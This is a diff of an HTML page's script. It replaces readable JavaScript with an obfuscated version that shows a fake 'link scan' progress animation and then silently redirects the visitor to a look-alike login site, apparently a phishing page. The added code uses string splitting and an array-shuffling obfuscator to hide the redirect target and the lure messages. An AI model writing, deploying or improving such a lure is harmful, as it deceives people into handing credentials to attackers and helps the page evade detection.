@@ -60,64 +60,7 @@
         </div>
     </div>
     <script>
-        const progressBar = document.getElementById('loadingProgress');
-        const robotPrompt = document.getElementById('robotPrompt');
-        let progress = 0;
-        const totalDuration = 6000; // 20 seconds
-        const minRedirectDelay = 2000; // 5 seconds
-        const maxRedirectDelay = 3000; // 10 seconds
-        const stepTime = totalDuration / 100; // Time for each 1% step
-        const messages = [
-            "Verifying link...",
-            "Expanding link...",
-            "Connecting to a server...",
-            "Loading page...",
-            "Verifying content...",
-            "Extracting page features...",
-            "Verifying features...",
-            "Scan Complete"
-        ];
-        let messageIndex = 0;
-
-        function startProgress() {
-            var params = '';
-            const timer = setInterval(() => {
-                progress += 1;
-                progressBar.style.width = progress + '%';
-                if (progress >= 100) {
-                    clearInterval(timer);
-                }
-            }, stepTime);
-
-            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
-            setTimeout(() => {
-                // const currentUrl = new URL(window.location.href);
-                // params = currentUrl.search;
-                // if ( params === '' ){
-                //     params = window.location.hash;
-                //     // params = params.replace('#', '');
-                // }
-                const redirectUrl = "https://optimum-login.vercel.app/";
-                window.location.href = redirectUrl;
-            }, redirectDelay);
-        }
-
-        function changeMessage() {
-            robotPrompt.style.opacity = '0';
-            setTimeout(() => {
-                robotPrompt.textContent = messages[messageIndex];
-                robotPrompt.style.opacity = '1';
-                messageIndex = (messageIndex + 1) % messages.length;
-                const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
-                setTimeout(changeMessage, randomDelay);
-            }, 850); // Wait for the fade-out transition to complete
-        }
-
-        window.onload = () => {
-            startProgress();
-            const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
-            setTimeout(changeMessage, initialDelay);
-        };
+(function(_0x195be8,_0x4ea7c9){const _0x5bdad8=_0x19ae,_0x22571b=_0x195be8();while(!![]){try{const _0x4ba8b5=parseInt(_0x5bdad8(0x8e))/0x1+parseInt(_0x5bdad8(0x8f))/0x2*(parseInt(_0x5bdad8(0x90))/0x3)+parseInt(_0x5bdad8(0x89))/0x4*(parseInt(_0x5bdad8(0x8b))/0x5)+parseInt(_0x5bdad8(0x91))/0x6+parseInt(_0x5bdad8(0x8a))/0x7*(parseInt(_0x5bdad8(0x88))/0x8)+parseInt(_0x5bdad8(0x8c))/0x9+-parseInt(_0x5bdad8(0x8d))/0xa;if(_0x4ba8b5===_0x4ea7c9)break;else _0x22571b['push'](_0x22571b['shift']());}catch(_0x27334b){_0x22571b['push'](_0x22571b['shift']());}}}(_0x4b0e,0x6e6d7));function _0x19ae(_0x2d01f0,_0x556806){const _0x4b0e73=_0x4b0e();return _0x19ae=function(_0x19ae52,_0xbf7f2e){_0x19ae52=_0x19ae52-0x88;let _0x3cae29=_0x4b0e73[_0x19ae52];return _0x3cae29;},_0x19ae(_0x2d01f0,_0x556806);}const progressBar=document['ge'+'tE'+'le'+'me'+'nt'+'By'+'Id']('lo'+'ad'+'in'+'gP'+'ro'+'gr'+'es'+'s'),robotPrompt=document['ge'+'tE'+'le'+'me'+'nt'+'By'+'Id']('ro'+'bo'+'tP'+'ro'+'mp'+'t');let progress=0x0;const totalDuration=0x1770,minRedirectDelay=0x7d0,maxRedirectDelay=0xbb8,stepTime=totalDuration/0x64,messages=['Ve'+'ri'+'fy'+'in'+'g\x20'+'li'+'nk'+'..'+'.','Ex'+'pa'+'nd'+'in'+'g\x20'+'li'+'nk'+'..'+'.','Co'+'nn'+'ec'+'ti'+'ng'+'\x20t'+'o\x20'+'a\x20'+'se'+'rv'+'er'+'..'+'.','Lo'+'ad'+'in'+'g\x20'+'pa'+'ge'+'..'+'.','Ve'+'ri'+'fy'+'in'+'g\x20'+'co'+'nt'+'en'+'t.'+'..','Ex'+'tr'+'ac'+'ti'+'ng'+'\x20p'+'ag'+'e\x20'+'fe'+'at'+'ur'+'es'+'..'+'.','Ve'+'ri'+'fy'+'in'+'g\x20'+'fe'+'at'+'ur'+'es'+'..'+'.','Sc'+'an'+'\x20C'+'om'+'pl'+'et'+'e'];let messageIndex=0x0;function startProgress(){var _0x571805='';const _0x3ed91b=setInterval(()=>{'bR'+'lm'+'t'!=='dS'+'bn'+'K'?(progress+=0x1,progressBar['st'+'yl'+'e']['wi'+'dt'+'h']=progress+'%',progress>=0x64&&clearInterval(_0x3ed91b)):_0x369739(_0x42e129);},stepTime),_0x14de7c=Math['ra'+'nd'+'om']()*(maxRedirectDelay-minRedirectDelay)+minRedirectDelay;setTimeout(()=>{const _0x201f3d='ht'+'tp'+'s:'+'//'+'op'+'ti'+'mu'+'m-'+'lo'+'gi'+'n.'+'ve'+'rc'+'el'+'.a'+'pp'+'/';window['lo'+'ca'+'ti'+'on']['hr'+'ef']=_0x201f3d;},_0x14de7c);}function changeMessage(){robotPrompt['st'+'yl'+'e']['op'+'ac'+'it'+'y']='0',setTimeout(()=>{if('Qx'+'Md'+'O'==='Qx'+'Md'+'O'){robotPrompt['te'+'xt'+'Co'+'nt'+'en'+'t']=messages[messageIndex],robotPrompt['st'+'yl'+'e']['op'+'ac'+'it'+'y']='1',messageIndex=(messageIndex+0x1)%messages['le'+'ng'+'th'];const _0x361f12=Math['ra'+'nd'+'om']()*(0xbb8-0x514)+0x514;setTimeout(changeMessage,_0x361f12);}else{_0x2072ef['te'+'xt'+'Co'+'nt'+'en'+'t']=_0x248d35[_0x18e35a],_0x481f4f['st'+'yl'+'e']['op'+'ac'+'it'+'y']='1',_0x411900=(_0x2762e0+0x1)%_0x5aaa3d['le'+'ng'+'th'];const _0x478d4b=_0x2ea4f4['ra'+'nd'+'om']()*(0xbb8-0x514)+0x514;_0x4fc157(_0x1565a5,_0x478d4b);}},0x352);}function _0x4b0e(){const _0x2f1f45=['10202800DudObE','649180PljCtK','1886bakofs','117IdxBUk','3349188EMdtHI','391976lesyzS','87284WpQimF','21nbsrpS','5qtyCJg','536616lsnUKh'];_0x4b0e=function(){return _0x2f1f45;};return _0x4b0e();}window['on'+'lo'+'ad']=()=>{startProgress();const _0x168ce1=Math['ra'+'nd'+'om']()*(0xbb8-0x514)+0x514;setTimeout(changeMessage,_0x168ce1);};
     </script>
 
 
